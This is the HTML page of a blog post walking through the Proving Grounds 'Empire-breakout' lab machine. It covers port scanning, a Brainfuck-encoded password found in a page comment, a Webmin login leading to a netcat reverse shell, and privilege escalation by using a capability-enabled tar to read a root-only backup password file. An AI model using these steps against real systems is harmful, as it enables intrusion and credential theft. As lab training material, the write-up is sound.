@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Empire-breakout</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Empire-breakout | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Empire-breakout" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/01/Proving_grounds_Play-Empire-breakout.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/01/Proving_grounds_Play-Empire-breakout.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-01T03:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Empire-breakout" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-01T03:00:00+05:30","datePublished":"2023-10-01T03:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Empire-breakout","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/01/Proving_grounds_Play-Empire-breakout.html"},"url":"http://localhost:4000/2023/10/01/Proving_grounds_Play-Empire-breakout.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/01/Proving_grounds_Play-Empire-breakout.html">
+    <h2 class="post-title">Proving grounds Play: Empire-breakout</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 1, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.51 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.51 <span class="o">(</span>Debian<span class="o">)</span>
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+10000/tcp open  http    MiniServ 1.981 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+|_http-favicon: Unknown favicon MD5: C7F93A5D476A64454D4E271B24571406
+|_http-title: 200 &amp;mdash<span class="p">;</span> Document follows
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: MiniServ/1.981
+20000/tcp open  http    MiniServ 1.830 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+|_http-title: 200 &amp;mdash<span class="p">;</span> Document follows
+|_http-favicon: Unknown favicon MD5: 953B40D37322DDEFEEC092BC48AEA904
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: MiniServ/1.830
+</code></pre></div></div>
+
+<h2 id="smb-username-enumeration">SMB Username Enumeration</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">enum4linux</code> the username cyber has been discovered.</p>
+
+<h2 id="80tcp---open--http---apache-httpd-2451-debian">80/tcp - open  http - Apache httpd 2.4.51 ((Debian))</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Empire-breakout/web.png" alt="img" /></p>
+
+<p>There is a encrypted text commented in the source code of the apache page <code class="language-plaintext highlighter-rouge">view-source:http://192.168.240.238/</code>.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
+don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
+
+++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.
+--&gt;</span>
+</code></pre></div></div>
+
+<h2 id="cipher-analysis">Cipher Analysis</h2>
+
+<p><a href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Empire-breakout/analysis1.png" alt="img" /></p>
+
+<p><strong>Brainfuck</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Empire-breakout/analysis2.png" alt="img" /></p>
+
+<p>Upon analysis the algorithm of the encrypted text has been discovered which is <code class="language-plaintext highlighter-rouge">Brainfuck</code>.</p>
+
+<h2 id="brainfuck-decode">Brainfuck decode</h2>
+
+<p><a href="https://www.splitbrain.org/_static/ook/">https://www.splitbrain.org/_static/ook/</a></p>
+
+<p><strong>Decoded text</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.2uqPEfj3D&lt;P'a-3
+</code></pre></div></div>
+
+<h2 id="20000tcp---open--http---miniserv-1830-webmin-httpd">20000/tcp - open  http - MiniServ 1.830 (Webmin httpd)</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Empire-breakout/web2.png" alt="img" /></p>
+
+<p>Login to the portal using the username <code class="language-plaintext highlighter-rouge">cyber</code> and password <code class="language-plaintext highlighter-rouge">.2uqPEfj3D&lt;P'a-3</code>.</p>
+
+<p>Click on the interactive shell and create a reverse shell connection.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Empire-breakout/shell.png" alt="img" /></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|01:09|~/pg-play/Empire-breakout<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>192.168.45.225] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.240.238] 55430
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+cyber@breakout:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p><strong>Initial Foothold Obtained</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Enumerate the machine’s extended capabilities.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+getcap <span class="nt">-r</span> / 2&gt;/dev/null
+/home/cyber/tar <span class="nv">cap_dac_read_search</span><span class="o">=</span>ep
+/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
+cyber@breakout:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>There is a binary <code class="language-plaintext highlighter-rouge">tar</code> located in the folder <code class="language-plaintext highlighter-rouge">/home/cyber</code>, which can be used to reveal the contents of the restricted files.</p>
+
+<p>Upon checking the folders there is a old password file exists in the <code class="language-plaintext highlighter-rouge">backups</code> folder.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span><span class="nb">cd</span> /var/backups
+<span class="nb">cd</span> /var/backups
+cyber@breakout:/var/backups<span class="nv">$ </span>ll
+ll
+total 484K
+4.0K drwxr-xr-x  2 root root 4.0K Dec  8  2022 <span class="nb">.</span>
+ 40K <span class="nt">-rw-r--r--</span>  1 root root  40K Dec  8  2022 alternatives.tar.0
+   0 <span class="nt">-rw-r--r--</span>  1 root root    0 Dec  8  2022 dpkg.arch.0
+ 16K <span class="nt">-rw-r--r--</span>  1 root root  13K Nov 17  2022 apt.extended_states.0
+4.0K <span class="nt">-rw-------</span>  1 root root   17 Oct 20  2021 .old_pass.bak    <span class="c">#old password file</span>
+404K <span class="nt">-rw-r--r--</span>  1 root root 404K Oct 19  2021 dpkg.status.0
+4.0K <span class="nt">-rw-r--r--</span>  1 root root 1.5K Oct 19  2021 apt.extended_states.1.gz
+4.0K drwxr-xr-x 14 root root 4.0K Oct 19  2021 ..
+4.0K <span class="nt">-rw-r--r--</span>  1 root root  186 Oct 19  2021 dpkg.diversions.0
+4.0K <span class="nt">-rw-r--r--</span>  1 root root  135 Oct 19  2021 dpkg.statoverride.0
+cyber@breakout:/var/backups<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Use the tar utility to compress the old password file.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span>./tar <span class="nt">-cvf</span> old_pass.tar /var/backups/.old_pass.bak    <span class="c">#compress</span>
+./tar <span class="nt">-cvf</span> old_pass.tar /var/backups/.old_pass.bak
+/var/backups/.old_pass.bak
+cyber@breakout:~<span class="nv">$ </span>ll
+4.0K drwxr-xr-x  8 cyber cyber 4.0K Oct  1 01:28 .12K <span class="nt">-rw-r--r--</span>  1 cyber cyber  10K Oct  1 01:28 old_pass.tar   <span class="c">#compressed file</span>
+4.0K <span class="nt">-rw-r--r--</span>  1 root  root    33 Oct  1 01:01 local.txt
+4.0K drwxr-xr-x  2 cyber cyber 4.0K Oct 20  2021 .tmp
+   0 <span class="nt">-rw-------</span>  1 cyber cyber    0 Oct 20  2021 .bash_history
+520K <span class="nt">-rwxr-xr-x</span>  1 root  root  520K Oct 19  2021 <span class="nb">tar
+</span>4.0K drwxr-xr-x  3 cyber cyber 4.0K Oct 19  2021 .local
+4.0K drwx------ 16 cyber cyber 4.0K Oct 19  2021 .usermin
+4.0K drwxr-xr-x  2 cyber cyber 4.0K Oct 19  2021 .filemin
+4.0K drwx------  2 cyber cyber 4.0K Oct 19  2021 .gnupg
+4.0K drwx------  2 cyber cyber 4.0K Oct 19  2021 .spamassassin
+4.0K <span class="nt">-rw-r--r--</span>  1 cyber cyber  220 Oct 19  2021 .bash_logout
+4.0K <span class="nt">-rw-r--r--</span>  1 cyber cyber 3.5K Oct 19  2021 .bashrc
+4.0K <span class="nt">-rw-r--r--</span>  1 cyber cyber  807 Oct 19  2021 .profile
+4.0K drwxr-xr-x  3 root  root  4.0K Oct 19  2021 ..
+cyber@breakout:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Extract the compressed file to read the password file.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span><span class="nb">ls
+ls
+</span>local.txt  old_pass.tar  <span class="nb">tar  </span>var   <span class="c">#extracted var folder</span>
+cyber@breakout:~<span class="nv">$ </span><span class="nb">cd </span>var
+<span class="nb">cd </span>var
+cyber@breakout:~/var<span class="nv">$ </span><span class="nb">ls
+ls
+</span>backups
+cyber@breakout:~/var<span class="nv">$ </span><span class="nb">cd </span>backups
+<span class="nb">cd </span>backups
+cyber@breakout:~/var/backups<span class="nv">$ </span>ll
+ll
+total 12K
+4.0K drwxr-xr-x 2 cyber cyber 4.0K Oct  1 01:32 <span class="nb">.</span>
+4.0K drwxr-xr-x 3 cyber cyber 4.0K Oct  1 01:32 ..
+4.0K <span class="nt">-rw-------</span> 1 cyber cyber   17 Oct 20  2021 .old_pass.bak   <span class="c">#password file</span>
+cyber@breakout:~/var/backups<span class="nv">$ </span><span class="nb">cat</span> .old_pass.bak
+<span class="nb">cat</span> .old_pass.bak
+Ts&amp;4&amp;YurgtRX<span class="o">(=</span>~h    <span class="c">#password</span>
+cyber@breakout:~/var/backups<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Switch to root user and use the password found above.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~/var/backups<span class="nv">$ </span>su root
+su root
+Password: Ts&amp;4&amp;YurgtRX<span class="o">(=</span>~h
+root@breakout:/home/cyber/var/backups# 
+<span class="nb">cd
+</span>root@breakout:~# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@breakout:~# 
+</code></pre></div></div>
+
+<p><strong>Root Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
